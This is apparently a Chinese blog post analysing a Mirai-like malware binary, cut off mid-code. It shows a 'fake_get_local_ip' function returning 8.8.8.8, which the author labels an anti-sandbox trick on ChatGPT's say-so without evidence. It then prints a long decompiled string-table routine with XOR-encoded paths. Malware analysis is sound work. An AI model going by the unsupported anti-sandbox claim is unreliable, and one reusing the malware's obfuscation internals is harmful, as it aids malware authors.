<p>本来函数逻辑较为简单，并没有什么含义，但是我在这里提交到了chatGPT，意外发现了这一段代码的特别用处：反沙箱。<br><strong>反沙箱(Anti-Sandbox)</strong> 是一种恶意软件常用技术，目的是检测是否运行在虚拟化，沙箱，分析环境中，如果发现自己在“被分析”，就会：</p>
<ul>
<li>停止恶意行为</li>
<li>模拟正常程序行为</li>
<li>返回伪造数据</li>
<li>误导分析者</li>
</ul>
<h3 id="该函数如何反沙箱？"><a href="#该函数如何反沙箱？" class="headerlink" title="该函数如何反沙箱？"></a>该函数如何反沙箱？</h3><p>虽然<code>fack_get_local_ip()</code>表面是一个返回固定值的函数，但它在以下几种场景下，配合其他行为一起用于反沙箱&#x2F;反分析：<br>伪装“动态获取 IP 地址”<br>在真实环境中，程序通常会通常会通过如下方式获取本地ip：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">getsockname(sock, (<span class="keyword">struct</span> sockaddr *)&amp;addr, &amp;len);</span><br></pre></td></tr></table></figure></div>
<p>但是该函数：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fake_get_local_ip</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x08080808</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>伪装成动态行为</li>
<li>实际返回硬编码常量（8.8.8.8）</li>
<li>在沙箱或者静态分析时，这种结构容易误导分析人员，让他们以为是动态联网功能</li>
</ul>
<h2 id="初始化加密资源表："><a href="#初始化加密资源表：" class="headerlink" title="初始化加密资源表："></a>初始化加密资源表：</h2><p>在完成以上初始化之后，对资源表进行了初始化：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">table_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v23; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v24; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v25; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v26; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v27; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v28; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v29; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v30; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v31; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v32; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v33; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v34; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v35; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v36; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v37; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v38; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v39; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v40; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v41; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v42; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v43; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v44; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v45; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v46; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v47; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v48; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v49; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v50; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v51; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v52; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v53; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v54; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v55; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v56; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v57; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v58; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v59; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v60; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v61; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v62; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v63; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v64; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v65; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v66; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v67; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v68; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v69; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v70; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v71; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v72; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v73; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v74; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v75; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v76; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v77; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v78; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v79; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v80; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v81; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v82; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v83; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v84; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v85; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v86; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v87; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v88; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v89; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v90; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v91; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v92; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v93; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v94; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v95; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v96; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v97; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v98; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v99; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v100; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">malloc</span>(<span class="number">17</span>);</span><br><span class="line">  util_memcpy(v0, &amp;unk_20CF4, <span class="number">17</span>);</span><br><span class="line">  dword_2D800 = v0;</span><br><span class="line">  word_2D804 = <span class="number">17</span>;</span><br><span class="line">  v1 = <span class="built_in">malloc</span>(<span class="number">2</span>);</span><br><span class="line">  util_memcpy(v1, &amp;unk_20D08, <span class="number">2</span>);</span><br><span class="line">  dword_2D808 = v1;</span><br><span class="line">  word_2D80C = <span class="number">2</span>;</span><br><span class="line">  v2 = <span class="built_in">malloc</span>(<span class="number">13</span>);</span><br><span class="line">  util_memcpy(v2, &amp;unk_20D0C, <span class="number">13</span>);</span><br><span class="line">  word_2D814 = <span class="number">13</span>;</span><br><span class="line">  dword_2D810 = v2;</span><br><span class="line">  v3 = <span class="built_in">malloc</span>(<span class="number">15</span>);</span><br><span class="line">  util_memcpy(v3, &amp;unk_20D1C, <span class="number">15</span>);</span><br><span class="line">  dword_2D818 = v3;</span><br><span class="line">  word_2D81C = <span class="number">15</span>;</span><br><span class="line">  v4 = <span class="built_in">malloc</span>(<span class="number">7</span>);</span><br><span class="line">  util_memcpy(v4, <span class="string">&quot;\rRPMA\r\&quot;&quot;</span>, <span class="number">7</span>);</span><br><span class="line">  dword_2D820 = v4;</span><br><span class="line">  word_2D824 = <span class="number">7</span>;</span><br><span class="line">  v5 = <span class="built_in">malloc</span>(<span class="number">5</span>);</span><br><span class="line">  util_memcpy(v5, <span class="string">&quot;\rGZG\&quot;&quot;</span>, <span class="number">5</span>);</span><br><span class="line">  dword_2D828 = v5;</span><br><span class="line">  word_2D82C = <span class="number">5</span>;</span><br><span class="line">  v6 = <span class="built_in">malloc</span>(<span class="number">4</span>);</span><br><span class="line">  util_memcpy(v6, <span class="string">&quot;\rDF\&quot;&quot;</span>, <span class="number">4</span>);</span><br><span class="line">  dword_2D830 = v6;</span><br><span class="line">  word_2D834 = <span class="number">4</span>;</span><br><span class="line">  v7 = <span class="built_in">malloc</span>(<span class="number">6</span>);</span><br><span class="line">  util_memcpy(v7, <span class="string">&quot;\rOCRQ\&quot;&quot;</span>, <span class="number">6</span>);</span><br><span class="line">  dword_2D838 = v7;</span><br><span class="line">  word_2D83C = <span class="number">6</span>;</span><br><span class="line">  v8 = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">  util_memcpy(v8, <span class="string">&quot;\rQVCVWQ\&quot;&quot;</span>, <span class="number">8</span>);</span><br><span class="line">  word_2D844 = <span class="number">8</span>;</span><br><span class="line">  dword_2D840 = v8;</span><br><span class="line">  v9 = <span class="built_in">malloc</span>(<span class="number">14</span>);</span><br><span class="line">  util_memcpy(v9, <span class="string">&quot;\rRPMA\rLGV\rVAR\&quot;&quot;</span>, <span class="number">14</span>);</span><br><span class="line">  dword_2D848 = v9;</span><br><span class="line">  word_2D84C = <span class="number">14</span>;</span><br><span class="line">  v10 = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">  util_memcpy(v10, <span class="string">&quot;\rAOFNKLG\&quot;&quot;</span>, <span class="number">9</span>);</span><br><span class="line">  dword_2D850 = v10;</span><br><span class="line">  word_2D854 = <span class="number">9</span>;</span><br><span class="line">  v11 = <span class="built_in">malloc</span>(<span class="number">5</span>);</span><br><span class="line">  util_memcpy(v11, <span class="string">&quot;VOR\r\&quot;&quot;</span>, <span class="number">5</span>);</span><br><span class="line">  dword_2D860 = v11;</span><br><span class="line">  word_2D864 = <span class="number">5</span>;</span><br><span class="line">  v12 = <span class="built_in">malloc</span>(<span class="number">11</span>);</span><br><span class="line">  util_memcpy(v12, <span class="string">&quot;FCVC\rNMACN\&quot;&quot;</span>, <span class="number">11</span>);</span><br><span class="line">  word_2D86C = <span class="number">11</span>;</span><br><span class="line">  dword_2D868 = v12;</span><br><span class="line">  v13 = <span class="built_in">malloc</span>(<span class="number">7</span>);</span><br><span class="line">  util_memcpy(v13, <span class="string">&quot;SVZ@MV\&quot;&quot;</span>, <span class="number">7</span>);</span><br><span class="line">  dword_2D870 = v13;</span><br><span class="line">  word_2D874 = <span class="number">7</span>;</span><br><span class="line">  v14 = <span class="built_in">malloc</span>(<span class="number">2</span>);</span><br><span class="line">  util_memcpy(v14, &amp;unk_20D90, <span class="number">2</span>);</span><br><span class="line">  dword_2D878 = v14;</span><br><span class="line">  word_2D87C = <span class="number">2</span>;</span><br><span class="line">  v15 = <span class="built_in">malloc</span>(<span class="number">4</span>);</span><br><span class="line">  util_memcpy(v15, <span class="string">&quot;CPA\&quot;&quot;</span>, <span class="number">4</span>);</span><br><span class="line">  dword_2D880 = v15;</span><br><span class="line">  word_2D884 = <span class="number">4</span>;</span><br><span class="line">  v16 = <span class="built_in">malloc</span>(<span class="number">4</span>);</span><br><span class="line">  util_memcpy(v16, <span class="string">&quot;CPO\&quot;&quot;</span>, <span class="number">4</span>);</span><br><span class="line">  dword_2D888 = v16;</span><br><span class="line">  word_2D88C = <span class="number">4</span>;</span><br><span class="line">  v17 = <span class="built_in">malloc</span>(<span class="number">5</span>);</span><br><span class="line">  util_memcpy(v17, &amp;unk_20DA4, <span class="number">5</span>);</span><br><span class="line">  dword_2D890 = v17;</span><br><span class="line">  word_2D894 = <span class="number">5</span>;</span><br><span class="line">  v18 = <span class="built_in">malloc</span>(<span class="number">5</span>);</span><br><span class="line">  util_memcpy(v18, &amp;unk_20DAC, <span class="number">5</span>);</span><br><span class="line">  dword_2D898 = v18;</span><br><span class="line">  word_2D89C = <span class="number">5</span>;</span><br><span class="line">  v19 = <span class="built_in">malloc</span>(<span class="number">5</span>);</span><br><span class="line">  util_memcpy(v19, &amp;unk_20DB4, <span class="number">5</span>);</span><br><span class="line">  dword_2D8A0 = v19;</span><br><span class="line">  word_2D8A4 = <span class="number">5</span>;</span><br><span class="line">  v20 = <span class="built_in">malloc</span>(<span class="number">4</span>);</span><br><span class="line">  util_memcpy(v20, &amp;unk_20DBC, <span class="number">4</span>);</span><br><span class="line">  dword_2D8A8 = v20;</span><br><span class="line">  word_2D8AC = <span class="number">4</span>;</span><br><span class="line">  v21 = <span class="built_in">malloc</span>(<span class="number">7</span>);</span><br><span class="line">  util_memcpy(v21, &amp;unk_20DC4, <span class="number">7</span>);</span><br><span class="line">  dword_2D8B0 = v21;</span><br><span class="line">  word_2D8B4 = <span class="number">7</span>;</span><br><span class="line">  v22 = <span class="built_in">malloc</span>(<span class="number">4</span>);</span><br><span class="line">  util_memcpy(v22, &amp;unk_20DCC, <span class="number">4</span>);</span><br><span class="line">  dword_2D8B8 = v22;</span><br><span class="line">  word_2D8BC = <span class="number">4</span>;</span><br><span class="line">  v23 = <span class="built_in">malloc</span>(<span class="number">5</span>);</span><br><span class="line">  util_memcpy(v23, <span class="string">&quot;OKRQ\&quot;&quot;</span>, <span class="number">5</span>);</span><br><span class="line">  dword_2D8C0 = v23;</span><br><span class="line">  word_2D8C4 = <span class="number">5</span>;</span><br><span class="line">  v24 = <span class="built_in">malloc</span>(<span class="number">5</span>);</span><br><span class="line">  util_memcpy(v24, <span class="string">&quot;ORQN\&quot;&quot;</span>, <span class="number">5</span>);</span><br><span class="line">  dword_2D8C8 = v24;</span><br><span class="line">  word_2D8CC = <span class="number">5</span>;</span><br><span class="line">  v25 = <span class="built_in">malloc</span>(<span class="number">4</span>);</span><br><span class="line">  util_memcpy(v25, <span class="string">&quot;RRA\&quot;&quot;</span>, <span class="number">4</span>);</span><br><span class="line">  dword_2D8D0 = v25;</span><br><span class="line">  word_2D8D4 = <span class="number">4</span>;</span><br><span class="line">  v26 = <span class="built_in">malloc</span>(<span class="number">4</span>);</span><br><span class="line">  util_memcpy(v26, <span class="string">&quot;QFC\&quot;&quot;</span>, <span class="number">4</span>);</span><br><span class="line">  dword_2D8D8 = v26;</span><br><span class="line">  word_2D8DC = <span class="number">4</span>;</span><br><span class="line">  v27 = <span class="built_in">malloc</span>(<span class="number">4</span>);</span><br><span class="line">  util_memcpy(v27, <span class="string">&quot;OVF\&quot;&quot;</span>, <span class="number">4</span>);</span><br><span class="line">  dword_2D8E0 = v27;</span><br><span class="line">  word_2D8E4 = <span class="number">4</span>;</span><br><span class="line">  v28 = <span class="built_in">malloc</span>(<span class="number">5</span>);</span><br><span class="line">  util_memcpy(v28, &amp;unk_20DFC, <span class="number">5</span>);</span><br><span class="line">  dword_2D8E8 = v28;</span><br><span class="line">  word_2D8EC = <span class="number">5</span>;</span><br><span class="line">  v29 = <span class="built_in">malloc</span>(<span class="number">6</span>);</span><br><span class="line">  util_memcpy(v29, <span class="string">&quot;JCICK\&quot;&quot;</span>, <span class="number">6</span>);</span><br><span class="line">  dword_2D8F0 = v29;</span><br><span class="line">  word_2D8F4 = <span class="number">6</span>;</span><br><span class="line">  v30 = <span class="built_in">malloc</span>(<span class="number">21</span>);</span><br><span class="line">  util_memcpy(v30, &amp;unk_20E0C, <span class="number">21</span>);</span><br><span class="line">  word_2D8FC = <span class="number">21</span>;</span><br><span class="line">  dword_2D8F8 = v30;</span><br><span class="line">  v31 = <span class="built_in">malloc</span>(<span class="number">17</span>);</span><br><span class="line">  util_memcpy(v31, &amp;unk_20E24, <span class="number">17</span>);</span><br><span class="line">  word_2D904 = <span class="number">17</span>;</span><br><span class="line">  dword_2D900 = v31;</span><br><span class="line">  v32 = <span class="built_in">malloc</span>(<span class="number">12</span>);</span><br><span class="line">  util_memcpy(v32, &amp;unk_20E38, <span class="number">12</span>);</span><br><span class="line">  word_2D90C = <span class="number">12</span>;</span><br><span class="line">  dword_2D908 = v32;</span><br><span class="line">  v33 = <span class="built_in">malloc</span>(<span class="number">14</span>);</span><br><span class="line">  util_memcpy(v33, <span class="string">&quot;\rFGT\rUCVAJFME\&quot;&quot;</span>, <span class="number">14</span>);</span><br><span class="line">  word_2D914 = <span class="number">14</span>;</span><br><span class="line">  dword_2D910 = v33;</span><br><span class="line">  v34 = <span class="built_in">malloc</span>(<span class="number">19</span>);</span><br><span class="line">  util_memcpy(v34, <span class="string">&quot;\rFGT\rOKQA\rUCVAJFME\&quot;&quot;</span>, <span class="number">19</span>);</span><br><span class="line">  word_2D91C = <span class="number">19</span>;</span><br><span class="line">  dword_2D918 = v34;</span><br><span class="line">  v35 = <span class="built_in">malloc</span>(<span class="number">15</span>);</span><br><span class="line">  util_memcpy(v35, <span class="string">&quot;\rQ@KL\rUCVAJFME\&quot;&quot;</span>, <span class="number">15</span>);</span><br><span class="line">  word_2D924 = <span class="number">15</span>;</span><br><span class="line">  dword_2D920 = v35;</span><br><span class="line">  v36 = <span class="built_in">malloc</span>(<span class="number">14</span>);</span><br><span class="line">  util_memcpy(v36, <span class="string">&quot;\r@KL\rUCVAJFME\&quot;&quot;</span>, <span class="number">14</span>);</span><br><span class="line">  word_2D92C = <span class="number">14</span>;</span><br><span class="line">  dword_2D928 = v36;</span><br><span class="line">  v37 = <span class="built_in">malloc</span>(<span class="number">23</span>);</span><br><span class="line">  util_memcpy(v37, &amp;unk_20E8C, <span class="number">23</span>);</span><br><span class="line">  word_2D934 = <span class="number">23</span>;</span><br><span class="line">  dword_2D930 = v37;</span><br><span class="line">  v38 = <span class="built_in">malloc</span>(<span class="number">23</span>);</span><br><span class="line">  util_memcpy(v38, &amp;unk_20EA4, <span class="number">23</span>);</span><br><span class="line">  word_2D93C = <span class="number">23</span>;</span><br><span class="line">  dword_2D938 = v38;</span><br><span class="line">  v39 = <span class="built_in">malloc</span>(<span class="number">15</span>);</span><br><span class="line">  util_memcpy(v39, &amp;unk_20EBC, <span class="number">15</span>);</span><br><span class="line">  word_2D944 = <span class="number">15</span>;</span><br><span class="line">  dword_2D940 = v39;</span><br><span class="line">  v40 = <span class="built_in">malloc</span>(<span class="number">22</span>);</span><br><span class="line">  util_memcpy(v40, <span class="string">&quot;\rGVA\rFGDCWNV\rUCVAJFME\&quot;&quot;</span>, <span class="number">22</span>);</span><br><span class="line">  word_2D94C = <span class="number">22</span>;</span><br><span class="line">  dword_2D948 = v40;</span><br><span class="line">  v41 = <span class="built_in">malloc</span>(<span class="number">14</span>);</span><br><span class="line">  util_memcpy(v41, <span class="string">&quot;\rGVA\rUCVAJFME\&quot;&quot;</span>, <span class="number">14</span>);</span><br><span class="line">  word_2D954 = <span class="number">14</span>;</span><br><span class="line">  dword_2D950 = v41;</span><br><span class="line">  v42 = <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line">  util_memcpy(v42, <span class="string">&quot;FTPjGNRGP\&quot;&quot;</span>, <span class="number">10</span>);</span><br><span class="line">  word_2D95C = <span class="number">10</span>;</span><br><span class="line">  dword_2D958 = v42;</span><br><span class="line">  v43 = <span class="built_in">malloc</span>(<span class="number">11</span>);</span><br><span class="line">  util_memcpy(v43, &amp;unk_20F00, <span class="number">11</span>);</span><br><span class="line">  word_2D964 = <span class="number">11</span>;</span><br><span class="line">  dword_2D960 = v43;</span><br><span class="line">  v44 = <span class="built_in">malloc</span>(<span class="number">15</span>);</span><br><span class="line">  util_memcpy(v44, &amp;unk_20F0C, <span class="number">15</span>);</span><br><span class="line">  word_2D96C = <span class="number">15</span>;</span><br><span class="line">  dword_2D968 = v44;</span><br><span class="line">  v45 = <span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">  util_memcpy(v45, &amp;unk_20F1C, <span class="number">16</span>);</span><br><span class="line">  word_2D974 = <span class="number">16</span>;</span><br><span class="line">  dword_2D970 = v45;</span><br><span class="line">  v46 = <span class="built_in">malloc</span>(<span class="number">14</span>);</span><br><span class="line">  util_memcpy(v46, &amp;unk_20F30, <span class="number">14</span>);</span><br><span class="line">  word_2D97C = <span class="number">14</span>;</span><br><span class="line">  dword_2D978 = v46;</span><br><span class="line">  v47 = <span class="built_in">malloc</span>(<span class="number">11</span>);</span><br><span class="line">  util_memcpy(v47, <span class="string">&quot;kW&#123;EWHGkSL\&quot;&quot;</span>, <span class="number">11</span>);</span><br><span class="line">  word_2D984 = <span class="number">11</span>;</span><br><span class="line">  dword_2D980 = v47;</span><br><span class="line">  v48 = <span class="built_in">malloc</span>(<span class="number">5</span>);</span><br><span class="line">  util_memcpy(v48, &amp;unk_20F4C, <span class="number">5</span>);</span><br><span class="line">  word_2D98C = <span class="number">5</span>;</span><br><span class="line">  dword_2D988 = v48;</span><br><span class="line">  v49 = <span class="built_in">malloc</span>(<span class="number">5</span>);</span><br><span class="line">  util_memcpy(v49, <span class="string">&quot;AAcf\&quot;&quot;</span>, <span class="number">5</span>);</span><br><span class="line">  word_2D994 = <span class="number">5</span>;</span><br><span class="line">  dword_2D990 = v49;</span><br><span class="line">  v50 = <span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">  util_memcpy(v50, <span class="string">&quot;\rRPMA\rLGV\rPMWVG\&quot;&quot;</span>, <span class="number">16</span>);</span><br><span class="line">  word_2D9AC = <span class="number">16</span>;</span><br><span class="line">  dword_2D9A8 = v50;</span><br><span class="line">  v51 = <span class="built_in">malloc</span>(<span class="number">14</span>);</span><br><span class="line">  util_memcpy(v51, <span class="string">&quot;\rRPMA\rARWKLDM\&quot;&quot;</span>, <span class="number">14</span>);</span><br><span class="line">  word_2D9B4 = <span class="number">14</span>;</span><br><span class="line">  dword_2D9B0 = v51;</span><br><span class="line">  v52 = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">  util_memcpy(v52, <span class="string">&quot;`memokrq\&quot;&quot;</span>, <span class="number">9</span>);</span><br><span class="line">  word_2D9BC = <span class="number">9</span>;</span><br><span class="line">  dword_2D9B8 = v52;</span><br><span class="line">  v53 = <span class="built_in">malloc</span>(<span class="number">19</span>);</span><br><span class="line">  util_memcpy(v53, &amp;unk_20F8C, <span class="number">19</span>);</span><br><span class="line">  word_2D9C4 = <span class="number">19</span>;</span><br><span class="line">  dword_2D9C0 = v53;</span><br><span class="line">  v54 = <span class="built_in">malloc</span>(<span class="number">23</span>);</span><br><span class="line">  util_memcpy(v54, &amp;unk_20FA0, <span class="number">23</span>);</span><br><span class="line">  word_2D9CC = <span class="number">23</span>;</span><br><span class="line">  dword_2D9C8 = v54;</span><br><span class="line">  v55 = <span class="built_in">malloc</span>(<span class="number">14</span>);</span><br><span class="line">  util_memcpy(v55, <span class="string">&quot;\rFGT\rUCVAJFME\&quot;&quot;</span>, <span class="number">14</span>);</span><br><span class="line">  word_2D9D4 = <span class="number">14</span>;</span><br><span class="line">  dword_2D9D0 = v55;</span><br><span class="line">  v56 = <span class="built_in">malloc</span>(<span class="number">19</span>);</span><br><span class="line">  util_memcpy(v56, <span class="string">&quot;\rFGT\rOKQA\rUCVAJFME\&quot;&quot;</span>, <span class="number">19</span>);</span><br><span class="line">  word_2D9DC = <span class="number">19</span>;</span><br><span class="line">  dword_2D9D8 = v56;</span><br><span class="line">  v57 = <span class="built_in">malloc</span>(<span class="number">23</span>);</span><br><span class="line">  util_memcpy(v57, &amp;unk_20E8C, <span class="number">23</span>);</span><br><span class="line">  word_2D9E4 = <span class="number">23</span>;</span><br><span class="line">  dword_2D9E0 = v57;</span><br><span class="line">  v58 = <span class="built_in">malloc</span>(<span class="number">15</span>);</span><br><span class="line">  util_memcpy(v58, <span class="string">&quot;\rFGT\rLGVQNKLI\r\&quot;&quot;</span>, <span class="number">15</span>);</span><br><span class="line">  word_2D9EC = <span class="number">15</span>;</span><br><span class="line">  dword_2D9E8 = v58;</span><br><span class="line">  v59 = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">  util_memcpy(v59, <span class="string">&quot;rpktoqe\&quot;&quot;</span>, <span class="number">8</span>);</span><br><span class="line">  word_2D9F4 = <span class="number">8</span>;</span><br><span class="line">  dword_2D9F0 = v59;</span><br><span class="line">  v60 = <span class="built_in">malloc</span>(<span class="number">11</span>);</span><br><span class="line">  util_memcpy(v60, <span class="string">&quot;egvnmacnkr\&quot;&quot;</span>, <span class="number">11</span>);</span><br><span class="line">  word_2D9FC = <span class="number">11</span>;</span><br><span class="line">  dword_2D9F8 = v60;</span><br><span class="line">  v61 = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">  util_memcpy(v61, <span class="string">&quot;iknncvvi\&quot;&quot;</span>, <span class="number">9</span>);</span><br><span class="line">  word_2DA04 = <span class="number">9</span>;</span><br><span class="line">  dword_2DA00 = v61;</span><br><span class="line">  v62 = <span class="built_in">malloc</span>(<span class="number">6</span>);</span><br><span class="line">  util_memcpy(v62, &amp;unk_20FEC, <span class="number">6</span>);</span><br><span class="line">  word_2DA0C = <span class="number">6</span>;</span><br><span class="line">  dword_2DA08 = v62;</span><br><span class="line">  v63 = <span class="built_in">malloc</span>(<span class="number">5</span>);</span><br><span class="line">  util_memcpy(v63, &amp;unk_20FF4, <span class="number">5</span>);</span><br><span class="line">  word_2DA14 = <span class="number">5</span>;</span><br><span class="line">  dword_2DA10 = v63;</span><br><span class="line">  v64 = <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line">  util_memcpy(v64, &amp;unk_20FFC, <span class="number">10</span>);</span><br><span class="line">  word_2DA24 = <span class="number">10</span>;</span><br><span class="line">  dword_2DA20 = v64;</span><br><span class="line">  v65 = <span class="built_in">malloc</span>(<span class="number">15</span>);</span><br><span class="line">  util_memcpy(v65, &amp;unk_21008, <span class="number">15</span>);</span><br><span class="line">  word_2DA2C = <span class="number">15</span>;</span><br><span class="line">  dword_2DA28 = v65;</span><br><span class="line">  v66 = <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line">  util_memcpy(v66, &amp;unk_2101C, <span class="number">10</span>);</span><br><span class="line">  word_2DA34 = <span class="number">10</span>;</span><br><span class="line">  dword_2DA30 = v66;</span><br><span class="line">  v67 = <span class="built_in">malloc</span>(<span class="number">5</span>);</span><br><span class="line">  util_memcpy(v67, <span class="string">&quot;caf`\&quot;&quot;</span>, <span class="number">5</span>);</span><br><span class="line">  word_2DA3C = <span class="number">5</span>;</span><br><span class="line">  dword_2DA38 = v67;</span><br><span class="line">  v68 = <span class="built_in">malloc</span>(<span class="number">5</span>);</span><br><span class="line">  util_memcpy(v68, <span class="string">&quot;c@cF\&quot;&quot;</span>, <span class="number">5</span>);</span><br><span class="line">  word_2DA44 = <span class="number">5</span>;</span><br><span class="line">  dword_2DA40 = v68;</span><br><span class="line">  v69 = <span class="built_in">malloc</span>(<span 